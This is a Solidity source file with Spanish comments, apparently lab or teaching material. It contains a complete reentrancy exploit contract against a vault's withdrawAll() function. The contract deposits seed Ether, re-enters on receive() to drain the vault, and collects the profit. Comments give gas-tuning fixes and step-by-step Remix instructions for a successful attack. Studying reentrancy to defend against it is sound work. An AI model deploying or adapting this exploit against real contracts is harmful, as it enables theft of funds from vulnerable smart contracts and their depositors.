// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.26;

/**
 * @title AttackCryptoVault1
 * @notice Contrato malicioso que explota la vulnerabilidad de reentrancia
 *         de CryptoVault1.withdrawAll().
 *
 * ════════════════════════════════════════════════════════════════════
 *  CAUSA DEL ERROR "Failed to send funds" EN LA VERSIÓN ANTERIOR
 * ════════════════════════════════════════════════════════════════════
 *  CryptoVault1 envía Ether al atacante con:
 *      (bool sent,) = msg.sender.call{value: amount}("")
 *  Esta llamada solo reenvía al receptor el gas sobrante con un límite
 *  implícito. Si receive() del atacante consume demasiado gas (por los
 *  console.log de hardhat + llamadas externas anidadas), el call del
 *  vault falla → sent = false → require(sent) revierte todo.
 *
 *  Soluciones aplicadas:
 *   1. ELIMINADOS todos los console.log del receive() — consumen gas
 *      de forma inesperada en entornos sin nodo Hardhat real (Remix VM).
 *   2. GAS_BUFFER aumentado a 100_000 — margen real para ejecutar el
 *      cuerpo de receive() + la llamada reentrante a withdrawAll().
 *   3. MAX_DEPTH reducido a 10 — suficiente para demostrar el ataque
 *      sin arriesgar stack overflow ni OOG en Remix VM.
 *   4. NO se importa hardhat/console.sol — no disponible en Remix VM.
 *
 * ════════════════════════════════════════════════════════════════════
 *  FLUJO DEL ATAQUE
 * ════════════════════════════════════════════════════════════════════
 *  1. attack() deposita Ether en el vault (saldo legítimo).
 *  2. attack() llama a vault.withdrawAll().
 *  3. El vault transfiere Ether → ejecuta receive() de este contrato
 *     ANTES de poner accounts[this] = 0 (línea vulnerable del vault).
 *  4. receive() comprueba condiciones y vuelve a llamar withdrawAll().
 *  5. El bucle continúa hasta vaciar el vault, agotar gas o MAX_DEPTH.
 *
 * ════════════════════════════════════════════════════════════════════
 *  CÓMO PROBARLO EN REMIX
 * ════════════════════════════════════════════════════════════════════
 *  - Entorno: Remix VM (Cancun) — NO usar Injected Provider para tests.
 *  - Gas limit de la transacción: 3_000_000 (ajustar en "Gas limit" de Remix).
 *  - Paso 1: deploy CryptoVault1(50) desde Account 0.
 *  - Paso 2: deposit() 10 ETH desde Account 1.
 *  - Paso 3: deploy AttackCryptoVault1(<addr>) desde Account 2.
 *  - Paso 4: attack() con 1 ETH desde Account 2.
 *  - Paso 5: myBalance() debe ser > 1 ETH. collectProfit() para recogerlo.
 */

interface ICryptoVault1 {
    function deposit() external payable;
    function withdrawAll() external;
    function accounts(address) external view returns (uint256);
}

contract AttackCryptoVault1 {

    // ── Constantes ────────────────────────────────────────────────────────

    /// @dev Número máximo de reentradas. Valor conservador para Remix VM.
    ///      Subir si el vault tiene mucho más Ether que el depósito del atacante.
    uint256 public constant MAX_DEPTH = 10;

    /// @dev Gas mínimo requerido antes de lanzar otra reentrancia.
    ///      100_000 cubre: comprobaciones + llamada a withdrawAll() + margen.
    ///      CRÍTICO: si es muy bajo, el call del vault falla con OOG y revierte.
    uint256 public constant GAS_BUFFER = 100_000;

    // ── Estado ────────────────────────────────────────────────────────────

    ICryptoVault1 public immutable vault;
    address        public immutable attacker;

    /// @dev Profundidad actual de reentrancia (se reinicia en cada attack()).
    uint256 private depth;

    // ── Eventos ───────────────────────────────────────────────────────────

    event AttackStarted(uint256 value, uint256 vaultBalance);
    event AttackFinished(uint256 depth, uint256 contractBalance);
    event ReentryOccurred(uint256 depth, uint256 vaultBalance);

    // ── Constructor ───────────────────────────────────────────────────────

    constructor(address _vault) {
        vault    = ICryptoVault1(_vault);
        attacker = msg.sender;
    }

    // ── Función de ataque ─────────────────────────────────────────────────

    /**
     * @notice Ejecuta el ataque.
     * @dev    Enviar Ether (value > 0) para usarlo como semilla de depósito.
     *         El depósito mínimo en CryptoVault1 es 100 wei.
     *         Se recomienda al menos 1 ETH para que sea rentable.
     *
     *         IMPORTANTE en Remix: aumentar el Gas limit a 3_000_000
     *         en el panel de despliegue antes de ejecutar.
     */
    function attack() external payable {
        require(msg.sender == attacker, "Only attacker");
        require(msg.value >= 100, "Min 100 wei");

        depth = 0;

        emit AttackStarted(msg.value, address(vault).balance);

        // 1. Depositar para tener saldo registrado en el vault
        vault.deposit{value: msg.value}();

        // 2. Retirar → desencadena reentrancia vía receive()
        vault.withdrawAll();

        emit AttackFinished(depth, address(this).balance);
    }

    // ── receive() — núcleo de la reentrancia ─────────────────────────────

    /**
     * @dev  Se ejecuta cuando el vault hace call{value:...}("") hacia este contrato.
     *       En ese instante withdrawAll() del vault está pausada con
     *       accounts[address(this)] TODAVÍA sin poner a 0.
     *
     *       REGLAS CRÍTICAS para no revertir:
     *        - Sin console.log (consumen gas inesperadamente en Remix VM).
     *        - Comprobar gasleft() ANTES de reentrar.
     *        - Comprobar saldos ANTES de reentrar.
     *        - No superar MAX_DEPTH.
     */
    receive() external payable {
        depth++;

        // ── Condiciones de parada (sin logs para ahorrar gas) ─────────────
        if (depth >= MAX_DEPTH)                      return;
        if (gasleft() < GAS_BUFFER)                  return;
        if (address(vault).balance == 0)             return;
        if (vault.accounts(address(this)) == 0)      return;

        // ── Reentrancia: el saldo en vault sigue > 0, retirar de nuevo ────
        emit ReentryOccurred(depth, address(vault).balance);
        vault.withdrawAll();
    }

    // ── Recuperar ganancias ───────────────────────────────────────────────

    /**
     * @notice Transfiere todo el Ether de este contrato al propietario.
     * @dev    Llamar tras el ataque. El beneficio neto es el balance
     *         de este contrato menos el Ether invertido en attack().
     */
    function collectProfit() external {
        require(msg.sender == attacker, "Only attacker");
        uint256 total = address(this).balance;
        require(total > 0, "Nothing to collect");
        (bool ok, ) = attacker.call{value: total}("");
        require(ok, "Transfer failed");
    }

    // ── Helpers de consulta ───────────────────────────────────────────────

    /// @notice Ether actualmente en este contrato (beneficio acumulado).
    function myBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /// @notice Saldo que el vault aún registra para este contrato.
    function myVaultBalance() external view returns (uint256) {
        return vault.accounts(address(this));
    }

    /// @notice Balance actual del contrato víctima.
    function vaultBalance() external view returns (uint256) {
        return address(vault).balance;
    }
}